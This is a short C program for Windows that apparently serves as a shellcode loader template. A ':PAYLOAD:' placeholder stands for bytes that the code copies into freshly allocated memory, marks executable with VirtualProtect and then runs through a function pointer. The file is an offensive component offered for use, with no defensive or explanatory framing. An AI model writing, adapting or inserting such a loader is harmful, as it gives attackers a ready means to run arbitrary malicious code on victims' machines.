#include <stdio.h>
#include <windows.h>

unsigned char payload[]	 = ":PAYLOAD:";
unsigned int payload_len = sizeof(payload);

void (*entry)();

int main(void) {
	void *shellcode;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	// Shellcode
	shellcode = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlMoveMemory(shellcode, payload, payload_len);
	rv = VirtualProtect(shellcode, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("[+] Execute: %p\n", shellcode);

	entry = (void (*)()) shellcode;
	entry();

	printf("[+] End...");
}